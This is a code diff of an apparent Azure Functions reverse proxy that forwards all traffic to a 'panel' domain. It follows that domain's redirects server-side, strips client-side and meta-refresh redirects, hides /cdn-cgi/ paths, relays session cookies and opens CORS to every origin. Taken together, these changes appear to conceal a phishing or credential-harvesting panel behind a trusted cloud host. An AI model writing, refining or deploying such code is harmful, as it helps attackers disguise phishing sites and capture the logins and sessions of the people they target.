@@ -1,32 +1,22 @@
-const crypto = require('crypto');
-const PANEL = 'tute.ink';
+const PANEL = 'tute.ink'; // Using your new panel domain
 
 module.exports = async function (context, req) {
     let path = req.headers['x-ms-original-url'] || req.url || '/';
     try { if (path.startsWith('http')) { const u = new URL(path); path = u.pathname + u.search; } } catch(e){}
-    
-    path = path.replace(/^\/api\/proxy/, '');
+    path = path.replace(/^\/api\/proxy/, '') || '/';
     if (!path.startsWith('/')) path = '/' + path;
 
-    const parts = path.split('/').filter(Boolean);
-    let code = '';
-
-    // Grab the code from the query string (our new fetch method) or the URL path
-    if (req.query && req.query.code) {
-        code = req.query.code;
-    } else if (parts.length >= 2 && parts[1].length > 4) {
-        code = parts[1];
-    } else if (parts.length === 1 && parts[0].length > 4 && parts[0] !== 'verify') {
-        code = parts[0];
+    if (req.query && Object.keys(req.query).length > 0) {
+        const qs = new URLSearchParams(req.query).toString();
+        if (!path.includes('?')) path += '?' + qs;
     }
 
-    if (!code) {
-        context.res = { status: 400, body: "Missing code." };
+    if (path.startsWith('/cdn-cgi/')) {
+        context.res = { status: 404, body: '' };
         return;
     }
 
-    let currentUrl = `https://${PANEL}/verify/${code}`;
-    context.log(`Forwarding ${req.method} to: ${currentUrl}`);
+    context.log('Forwarding to:', path);
 
     const forwardHeaders = {
         'Host': PANEL,
@@ -44,9 +34,11 @@ module.exports = async function (context, req) {
     }
 
     try {
+        let currentUrl = `https://${PANEL}${path}`;
         let r;
 
-        // Follow the panel's POST redirect server-side
+        // 🚨 FOLLOW REDIRECTS SERVER-SIDE 🚨
+        // This catches the app.py redirect to /l/ or /verify/ and follows it behind the scenes.
         for (let hop = 0; hop < 5; hop++) {
             r = await fetch(currentUrl, {
                 method: req.method,
@@ -58,8 +50,11 @@ module.exports = async function (context, req) {
             const loc = r.headers.get('location');
             if (r.status >= 300 && r.status < 400 && loc) {
                 let finalUrl = new URL(loc, currentUrl).toString();
-                finalUrl = finalUrl.replace(/^https:\/\/(www\.)?tute\.ink/, `https://${PANEL}`);
+                finalUrl = finalUrl.replace(/^https:\/\/(www\.)?nslaerospace\.sbs/, `https://${PANEL}`);
+                context.log(`Server-side Redirect hop ${hop} → ${finalUrl}`);
                 currentUrl = finalUrl;
+                req.method = 'GET'; // Flask redirects are GETs
+                body = undefined;
                 continue;
             }
             break;
@@ -68,7 +63,7 @@ module.exports = async function (context, req) {
         let responseBody = await r.text();
         const contentType  = r.headers.get('content-type') || 'text/html';
 
-        // Strip any lingering JS redirects
+        // 🚨 KILL CLIENT-SIDE JS REDIRECTS 🚨
         if (contentType.includes('text/html')) {
             responseBody = responseBody.replace(/<script\b[^>]*>([\s\S]*?)<\/script>/gi, function(match, scriptContent) {
                 if (scriptContent.includes('window.location') || scriptContent.includes('location.href')) {
@@ -76,18 +71,23 @@ module.exports = async function (context, req) {
                 }
                 return match;
             });
+            responseBody = responseBody.replace(/window\.location(\.[a-zA-Z]+)?\s*=\s*['"][^'"]+['"];?/gi, '');
+            responseBody = responseBody.replace(/window\.location\.(replace|assign)\(['"][^'"]+['"]\);?/gi, '');
+            responseBody = responseBody.replace(/<meta[^>]*http-equiv=["']?refresh["']?[^>]*>/gi, '');
         }
 
         const respHeaders = {
             'Content-Type': contentType,
             'Access-Control-Allow-Origin': '*',
+            'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
+            'Access-Control-Allow-Headers': 'Content-Type, Authorization',
             'Cache-Control': 'no-store, no-cache, must-revalidate'
         };
         
         const setCookie = r.headers.get('set-cookie');
         if (setCookie) respHeaders['Set-Cookie'] = setCookie;
 
-        context.res = { status: 200, headers: respHeaders, body: responseBody };
+        context.res = { status: r.status, headers: respHeaders, body: responseBody };
     } catch (e) {
         context.log('Error:', e.message);
         context.res = { status: 500, body: 'Proxy Error: ' + e.message };
